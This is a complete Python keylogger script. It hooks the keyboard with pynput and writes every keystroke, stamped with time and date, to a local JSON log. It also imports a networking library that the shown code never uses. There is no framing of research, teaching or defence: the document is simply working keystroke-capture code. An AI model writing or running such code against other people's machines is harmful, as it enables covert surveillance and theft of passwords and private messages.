from pynput import keyboard
import json
from datetime import datetime
import os
import requests
import time
import threading

typing_data = []
def backup(key_char):
    file_path = 'log.json'
    typing_data = []

    if os.path.exists(file_path) and os.path.getsize(file_path) > 0:
        with open(file_path, 'r') as file:
            try:
                loaded_data = json.load(file)
                if isinstance(loaded_data, list):
                    typing_data = loaded_data
                else:
                    typing_data = [loaded_data]
            except json.JSONDecodeError:
                typing_data = []

    now = datetime.now()
    new_keypress_data = {
        "time": now.strftime("%H:%M:%S"),
        "date": now.strftime("%m/%d/%Y"),
        "key": str(key_char)
    }
    
    typing_data.append(new_keypress_data)

    with open(file_path, 'w') as file:
        json.dump(typing_data, file, indent=4)
def on_press(key):
    try:
        backup(key.char)
    except AttributeError:
        backup(key)

if __name__ == "__main__":
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()
